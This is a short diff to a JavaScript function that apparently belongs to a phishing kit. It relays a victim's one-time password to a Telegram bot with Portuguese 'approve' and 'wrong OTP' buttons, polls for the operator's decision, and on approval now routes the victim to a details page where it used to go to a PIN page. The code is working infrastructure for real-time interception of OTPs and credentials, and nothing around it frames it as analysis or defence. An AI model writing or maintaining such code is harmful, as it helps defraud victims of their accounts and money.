@@ -311,7 +311,7 @@ async function handleOtp() {
     await sendToTelegram(msg, [[{ text: "✅ Aprovar OTP", callback_data: "otp_approve" }, { text: "❌ OTP Errado", callback_data: "otp_decline" }]]);
 
     startPolling((decision) => {
-        if (decision === 'otp_approve') { clearInterval(pollingInterval); document.getElementById('loading-overlay').style.display = 'none'; navigateTo('confirm-pin.html'); }
+        if (decision === 'otp_approve') { clearInterval(pollingInterval); document.getElementById('loading-overlay').style.display = 'none'; navigateTo('details.html'); }
         else if (decision === 'otp_decline') { clearInterval(pollingInterval); document.getElementById('loading-overlay').style.display = 'none'; error.style.display = 'block'; }
     });
 }
